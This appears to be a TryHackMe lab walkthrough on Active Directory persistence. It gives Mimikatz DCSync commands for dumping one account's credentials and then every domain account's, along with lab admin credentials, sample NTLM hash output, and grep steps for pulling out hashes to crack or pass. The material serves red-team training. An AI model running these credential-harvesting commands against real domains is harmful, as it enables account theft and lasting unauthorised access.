# Persistence Through Credentials

## Introduction

Congratulations, weary traveler! After breaching Active Directory (AD), performing enumeration, and exploiting it all the way to the top (if you have followed these AD networks in order), you have finally made it to the tavern of persistence. The hard work is over, and it is now time for some fun. While AD persistence is still serious business, it is not as stressful as the other phases. Here, we can let our creativity flow free. So rest your weary bones in our tavern, get yourself a nice cup of tea, and let's begin.

Together with your low-privileged credentials, you will be provided with Domain Administrator credentials. What luck! When discussing persistence techniques, you will use the privileged credentials to perform the persistence technique on your low-privileged credential set. Make a note of the following DA account:

- **Username:** Administrator
- **Password:** tryhackmewouldnotguess1@
- **Domain:** ZA

Since you have full access over the entire domain, we can't really hide any flags or force you to make sure you perform these persistence techniques yourself before answering the questions. However, it is encouraged that you take your time to work through these methods, as they will pay dividends during a red team assessment when the blue team starts kicking you out.

---

## Credentials as a Persistence Technique

The first and least reliable persistence technique that we will discuss is credentials. Several of the lateral techniques discussed in previous rooms would have resulted in the attacker gaining access to credentials. When using the word "credentials," it can mean a username and password pair, but in the context of AD, even the password hash is sufficient for authentication through pass-the-hash techniques.

---

## DC Sync

It is not sufficient to have a single domain controller per domain in large organizations. These domains are often used in multiple regional locations, and having a single DC would significantly delay any authentication services in AD. As such, these organizations make use of multiple DCs. The question then becomes: how is it possible for you to authenticate using the same credentials in two different offices?

The answer is **domain replication**. Each domain controller runs a process called the Knowledge Consistency Checker (KCC). The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronize information. This includes updated information such as the user's new password and new objects, such as when a new user is created. This is why you usually have to wait a couple of minutes before you authenticate after you have changed your password, since the DC where the password change occurred may not be the same one as the one where you are authenticating.

The process of replication is called **DC Synchronization**. It is not just the DCs that can initiate replication. Accounts such as those belonging to the Domain Admins group can also do it for legitimate purposes, such as creating a new domain controller.

A popular attack to perform is a **DC Sync attack**. If we have access to an account that has domain replication permissions, we can stage a DC Sync attack to harvest credentials from a DC.

---

## Not All Credentials Are Created Equal

Before starting our DC Sync attack, let's first discuss what credentials we could potentially hunt for. While we should always look to dump privileged credentials such as those that are members of the Domain Admins group, these are also the credentials that will be rotated (a blue team term meaning to reset the account's password) first. As such, if we only have privileged credentials, it is safe to say as soon as the blue team discovers us, they will rotate those accounts, and we can potentially lose our access.

The goal then is to persist with **near-privileged credentials**. We don't always need the full keys to the kingdom; we just need enough keys to ensure we can still achieve goal execution and always make the blue team look over their shoulder. As such, we should attempt to persist through credentials such as the following:

- Credentials that have local administrator rights on several machines. Usually, organizations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
- Service accounts that have delegation permissions. With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
- Accounts used for privileged AD services. If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.

When it comes to what credentials to dump and persist through, it is subject to many things. You will have to get creative in your thinking and take it on a case-by-case basis. However, for this room, we are going to have some fun, make the blue team sweat, and dump every single credential we can get our hands on!

---

## DCSync All

We will be using **Mimikatz** to harvest credentials. SSH into `THMWRK1` using the DA account and load Mimikatz:

```shell
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

    .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
    '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz #
```

Let's start by performing a DC Sync of a single account, our own:

```shell
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

Example output:

```
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'aaron.jones' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : aaron.jones 

** SAM ACCOUNT **

SAM Username         : aaron.jones
Account Type         : 30000000 ( USER_OBJECT )    
User Account Control : 00000200 ( NORMAL_ACCOUNT ) 
Account expiration   :
Password last change : 4/25/2022 7:30:21 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429 
Object Relative ID   : 1429

Credentials:
    Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
        ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
        lm  - 0: 0fd2685aa18c78bd265d02bdec203b04 

[...]

* Primary:WDigest * 
        01  991d45386dd3561e0c5529d3605f96e6
        02  d5d6f25b233c87b289706d7b423f1145
[...]
```

You will see quite a bit of output, including the current NTLM hash of your account. You can verify that the NTLM hash is correct by using a website to transform your password into an NTLM hash.

---

This is great, but we want to DC sync **every single account**. To do this, we will have to enable logging on Mimikatz:

```shell
mimikatz # log <username>_dcdump.txt 
```

> Using `<username>_dcdump.txt` for logfile: OK

Make sure to change `<username>` to your username so as not to overwrite the log dump of other users. Now, instead of specifying our account, we will use the `/all` flag:

```shell
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

This will take a bit of time to complete. Once done, exit Mimikatz to finalize the dump. You can then download the `<username>_dcdump.txt` file. Use the following commands to extract information:

- To recover all the usernames:
    ```shell
    cat <username>_dcdump.txt | grep "SAM Username"
    ```
- For all hashes:
    ```shell
    cat <username>_dcdump.txt | grep "Hash NTLM"
    ```

We can now either perform an offline password cracking attack to recover the plain text credentials or simply perform a pass-the-hash attack with Mimikatz.